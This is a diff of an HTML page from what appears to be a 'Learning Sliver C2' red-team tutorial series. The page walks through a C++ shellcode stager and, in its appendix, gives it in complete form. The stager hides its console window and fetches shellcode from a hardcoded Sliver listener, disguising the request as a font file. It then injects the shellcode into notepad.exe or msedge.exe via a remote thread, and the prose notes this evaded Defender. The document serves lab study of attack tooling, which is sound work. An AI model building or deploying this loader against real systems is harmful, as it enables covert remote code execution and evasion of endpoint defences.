+    <span style="color:#66d9ef">if</span> (INVALID_HANDLE_VALUE <span style="color:#f92672">==</span> hProcessSnapshot) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Process32First(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
+        CloseHandle(hProcessSnapshot);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    }
+
+    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">while</span> (Process32Next(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
+        <span style="color:#66d9ef">if</span> (lstrcmpiW(szProcname, pe32.szExeFile) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+            pid <span style="color:#f92672">=</span> pe32.th32ProcessID;
+            printf(<span style="color:#e6db74">&#34;Process found: %d %ls</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid, pe32.szExeFile);
+            <span style="color:#66d9ef">break</span>;
+        }
+    }
+
+    CloseHandle(hProcessSnapshot);
+    <span style="color:#66d9ef">return</span> pid;
+}
+
+<span style="color:#75715e">// ------ Injecting into process ------ //
+</span><span style="color:#75715e"></span>
+BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode) {
+    HANDLE hProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_VM_OPERATION <span style="color:#f92672">|</span> PROCESS_VM_WRITE <span style="color:#f92672">|</span> PROCESS_CREATE_THREAD, FALSE, dwPID);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hProcess) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; };
+    
+    LPVOID pRemoteAddr <span style="color:#f92672">=</span> VirtualAllocEx(hProcess, NULL, shellcode.dwSize, (MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT), PAGE_EXECUTE_READ);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pRemoteAddr) {
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    };
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>WriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, NULL)) {
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    };
+
+    HANDLE hThread <span style="color:#f92672">=</span> CreateRemoteThread(hProcess, NULL, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, <span style="color:#ae81ff">0</span>, NULL);
+    <span style="color:#66d9ef">if</span> (hThread <span style="color:#f92672">!=</span> NULL) {
+        WaitForSingleObject(hThread, <span style="color:#ae81ff">500</span>);
+
+        CloseHandle(hThread);
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+    }
+
+    CloseHandle(hProcess);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Time to make a message box appear on screen.
 Open up notepad, then run the program.
 The result should be similar to what you can see in the screenshot below.
 A terminal window should print the notepad&rsquo;s PID and you should also see the message box:</p>
@@ -873,21 +874,21 @@ In the <code>main</code> function, we take out the function <code>GetShellcode</
 and plug in a function <code>Download</code>, which downloads the shellcode
 from the stage listener located at <code>host</code> and <code>port</code>,
 which we hardcode to <code>sliver.labnet.local:80</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//::ShowWindow(::GetConsoleWindow(), SW_HIDE); // hide console window
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
-</span></span><span style="display:flex;"><span>    DWORD pid <span style="color:#f92672">=</span> GetTargetPID();
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>; }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> shellcode;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Download(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;sliver.labnet.local&#34;</span>, <span style="color:#ae81ff">80</span>, <span style="color:#f92672">&amp;</span>shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>; }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Injecting %ld bytes into PID %ld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, shellcode.dwSize, pid);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Inject(pid, shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>; }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Find the implementation of <code>Download</code> in the <a href="../../post/learning_sliver_c2_06_stagers/#c-stager">previous post</a>,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+    <span style="color:#75715e">//::ShowWindow(::GetConsoleWindow(), SW_HIDE); // hide console window
+</span><span style="color:#75715e"></span>    
+    DWORD pid <span style="color:#f92672">=</span> GetTargetPID();
+    <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>; }
+
+    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> shellcode;
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Download(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;sliver.labnet.local&#34;</span>, <span style="color:#ae81ff">80</span>, <span style="color:#f92672">&amp;</span>shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>; }
+
+    printf(<span style="color:#e6db74">&#34;Injecting %ld bytes into PID %ld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, shellcode.dwSize, pid);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Inject(pid, shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>; }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Find the implementation of <code>Download</code> in the <a href="../../post/learning_sliver_c2_06_stagers/#c-stager">previous post</a>,
 or check out the complete version of the final stager in this post&rsquo;s <a href="#appendix">appendix</a>.
 Note that the <code>Download</code> function from the previous post returned a <code>Shellcode</code> struct
 while we now need a <code>Download</code> function that stores the shellcode in a struct passed to it as an argument.
@@ -1238,197 +1239,197 @@ We got Sliver implants running without having to turn off Defender, which is goo
 <p>This is the complete stager with hidden console window,
 fully implemented download function
 and all print statements removed.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wininet.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;tlhelp32.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment (lib, &#34;Wininet.lib&#34;)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> {
-</span></span><span style="display:flex;"><span>    BYTE<span style="color:#f92672">*</span> pcData;
-</span></span><span style="display:flex;"><span>    DWORD dwSize;
-</span></span><span style="display:flex;"><span>};
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetTargetPID</span>();
-</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">Download</span>(LPCWSTR host, INTERNET_PORT port, Shellcode<span style="color:#f92672">*</span> shellcode);
-</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">::</span>ShowWindow(<span style="color:#f92672">::</span>GetConsoleWindow(), SW_HIDE); <span style="color:#75715e">// hide console window
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
-</span></span><span style="display:flex;"><span>    DWORD pid <span style="color:#f92672">=</span> GetTargetPID();
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>; }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> shellcode;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Download(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;sliver.labnet.local&#34;</span>, <span style="color:#ae81ff">80</span>, <span style="color:#f92672">&amp;</span>shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>; }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//printf(&#34;Injecting %ld bytes into PID %ld\n&#34;, shellcode.dwSize, pid);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Inject(pid, shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>; }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// ------ Getting the shellcode ------ //
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">Download</span>(LPCWSTR host, INTERNET_PORT port, Shellcode<span style="color:#f92672">*</span> shellcode) {
-</span></span><span style="display:flex;"><span>    HINTERNET session <span style="color:#f92672">=</span> InternetOpen(
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36&#34;</span>,
-</span></span><span style="display:flex;"><span>        INTERNET_OPEN_TYPE_PRECONFIG,
-</span></span><span style="display:flex;"><span>        NULL,
-</span></span><span style="display:flex;"><span>        NULL,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    HINTERNET connection <span style="color:#f92672">=</span> InternetConnect(
-</span></span><span style="display:flex;"><span>        session,
-</span></span><span style="display:flex;"><span>        host,
-</span></span><span style="display:flex;"><span>        port,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;&#34;</span>,
-</span></span><span style="display:flex;"><span>        INTERNET_SERVICE_HTTP,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    HINTERNET request <span style="color:#f92672">=</span> HttpOpenRequest(
-</span></span><span style="display:flex;"><span>        connection,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;GET&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;/fontawesome.woff&#34;</span>,
-</span></span><span style="display:flex;"><span>        NULL,
-</span></span><span style="display:flex;"><span>        NULL,
-</span></span><span style="display:flex;"><span>        NULL,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    WORD counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>HttpSendRequest(request, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)) {
-</span></span><span style="display:flex;"><span>        counter<span style="color:#f92672">++</span>;
-</span></span><span style="display:flex;"><span>        Sleep(<span style="color:#ae81ff">3000</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (counter <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// HTTP requests eventually failed
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    DWORD bufSize <span style="color:#f92672">=</span> BUFSIZ;
-</span></span><span style="display:flex;"><span>    BYTE<span style="color:#f92672">*</span> buffer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BYTE[bufSize];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    DWORD capacity <span style="color:#f92672">=</span> bufSize;
-</span></span><span style="display:flex;"><span>    BYTE<span style="color:#f92672">*</span> payload <span style="color:#f92672">=</span> (BYTE<span style="color:#f92672">*</span>)malloc(capacity);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    DWORD payloadSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (true) {
-</span></span><span style="display:flex;"><span>        DWORD bytesRead;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>InternetReadFile(request, buffer, bufSize, <span style="color:#f92672">&amp;</span>bytesRead)) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (bytesRead <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (payloadSize <span style="color:#f92672">+</span> bytesRead <span style="color:#f92672">&gt;</span> capacity) {
-</span></span><span style="display:flex;"><span>            capacity <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>;
-</span></span><span style="display:flex;"><span>            BYTE<span style="color:#f92672">*</span> newPayload <span style="color:#f92672">=</span> (BYTE<span style="color:#f92672">*</span>)realloc(payload, capacity);
-</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> newPayload;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> bytesRead; i<span style="color:#f92672">++</span>) {
-</span></span><span style="display:flex;"><span>            payload[payloadSize<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> buffer[i];
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    BYTE<span style="color:#f92672">*</span> newPayload <span style="color:#f92672">=</span> (BYTE<span style="color:#f92672">*</span>)realloc(payload, payloadSize);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    InternetCloseHandle(request);
-</span></span><span style="display:flex;"><span>    InternetCloseHandle(connection);
-</span></span><span style="display:flex;"><span>    InternetCloseHandle(session);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">*</span>shellcode).pcData <span style="color:#f92672">=</span> payload;
-</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">*</span>shellcode).dwSize <span style="color:#f92672">=</span> payloadSize;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// ------ Finding a target process ------ //
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize);
-</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetTargetPID</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> aszProclist[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;notepad.exe&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;msedge.exe&#34;</span>
-</span></span><span style="display:flex;"><span>    };
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> GetFirstPIDProclist(aszProclist, <span style="color:#66d9ef">sizeof</span>(aszProclist) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(aszProclist[<span style="color:#ae81ff">0</span>]));
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize) {
-</span></span><span style="display:flex;"><span>    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwSize; i<span style="color:#f92672">++</span>) {
-</span></span><span style="display:flex;"><span>        pid <span style="color:#f92672">=</span> GetFirstPIDProcname(aszProclist[i]);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> pid;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname) {
-</span></span><span style="display:flex;"><span>    HANDLE hProcessSnapshot <span style="color:#f92672">=</span> CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (INVALID_HANDLE_VALUE <span style="color:#f92672">==</span> hProcessSnapshot) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    PROCESSENTRY32 pe32;
-</span></span><span style="display:flex;"><span>    pe32.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Process32First(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
-</span></span><span style="display:flex;"><span>        CloseHandle(hProcessSnapshot);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (Process32Next(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lstrcmpiW(szProcname, pe32.szExeFile) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
-</span></span><span style="display:flex;"><span>            pid <span style="color:#f92672">=</span> pe32.th32ProcessID;
-</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//printf(&#34;Process found: %d %ls\n&#34;, pid, pe32.szExeFile);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    CloseHandle(hProcessSnapshot);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pid;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// ------ Injecting into process ------ //
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode) {
-</span></span><span style="display:flex;"><span>    HANDLE hProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_VM_OPERATION <span style="color:#f92672">|</span> PROCESS_VM_WRITE <span style="color:#f92672">|</span> PROCESS_CREATE_THREAD, FALSE, dwPID);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hProcess) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; };
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    LPVOID pRemoteAddr <span style="color:#f92672">=</span> VirtualAllocEx(hProcess, NULL, shellcode.dwSize, (MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT), PAGE_EXECUTE_READ);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pRemoteAddr) {
-</span></span><span style="display:flex;"><span>        CloseHandle(hProcess);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    };
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>WriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, NULL)) {
-</span></span><span style="display:flex;"><span>        CloseHandle(hProcess);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    };
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    HANDLE hThread <span style="color:#f92672">=</span> CreateRemoteThread(hProcess, NULL, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, <span style="color:#ae81ff">0</span>, NULL);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hThread <span style="color:#f92672">!=</span> NULL) {
-</span></span><span style="display:flex;"><span>        WaitForSingleObject(hThread, <span style="color:#ae81ff">500</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        CloseHandle(hThread);
-</span></span><span style="display:flex;"><span>        CloseHandle(hProcess);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    CloseHandle(hProcess);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wininet.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;tlhelp32.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#pragma comment (lib, &#34;Wininet.lib&#34;)
+</span><span style="color:#75715e"></span>
+
+<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> {
+    BYTE<span style="color:#f92672">*</span> pcData;
+    DWORD dwSize;
+};
+
+
+DWORD <span style="color:#a6e22e">GetTargetPID</span>();
+BOOL <span style="color:#a6e22e">Download</span>(LPCWSTR host, INTERNET_PORT port, Shellcode<span style="color:#f92672">*</span> shellcode);
+BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode);
+
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+    <span style="color:#f92672">::</span>ShowWindow(<span style="color:#f92672">::</span>GetConsoleWindow(), SW_HIDE); <span style="color:#75715e">// hide console window
+</span><span style="color:#75715e"></span>    
+    DWORD pid <span style="color:#f92672">=</span> GetTargetPID();
+    <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>; }
+
+    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> shellcode;
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Download(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;sliver.labnet.local&#34;</span>, <span style="color:#ae81ff">80</span>, <span style="color:#f92672">&amp;</span>shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>; }
+
+    <span style="color:#75715e">//printf(&#34;Injecting %ld bytes into PID %ld\n&#34;, shellcode.dwSize, pid);
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Inject(pid, shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>; }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#75715e">// ------ Getting the shellcode ------ //
+</span><span style="color:#75715e"></span>
+BOOL <span style="color:#a6e22e">Download</span>(LPCWSTR host, INTERNET_PORT port, Shellcode<span style="color:#f92672">*</span> shellcode) {
+    HINTERNET session <span style="color:#f92672">=</span> InternetOpen(
